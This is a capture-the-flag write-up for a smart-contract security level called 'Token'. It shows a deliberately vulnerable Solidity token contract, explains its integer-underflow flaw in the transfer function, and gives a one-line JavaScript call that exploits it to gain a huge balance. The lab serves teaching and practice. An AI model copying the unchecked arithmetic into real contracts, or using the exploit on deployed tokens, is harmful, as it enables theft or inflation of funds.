# 05. Token

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

## Vulnerability

This contract is pre solidity 0.8.0 and therefore doesn't throw on overflow or underflow by default. But it doesn't make use of SafeMath neither...
So the transfer function is vulnerable to underflow : 

With a starting balance of 20 , we can issue a transfer of 21 for example.
Using uint256 the operation 20 - 21 equals 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff due to underflow, giving us the highest possible balance.

However to get this maximum amount we cannot send from and to the same address because after causing an underflow on debit we would cause an overflow on credit briging us back to our original balance :

```solidity
    // balances[msg.sender] == 20
    balances[msg.sender] -= _value;
    // balances[msg.sender] == 0xfffff....ffff
    balances[_to] += _value;
    // balance[msg.sender] == 20
```

sending to any other address such as the 0x0 address solve that minor issue :

```js
await contract.transfer("0x0000000000000000000000000000000000000000", 21);
```

And the challenge is commpleted.





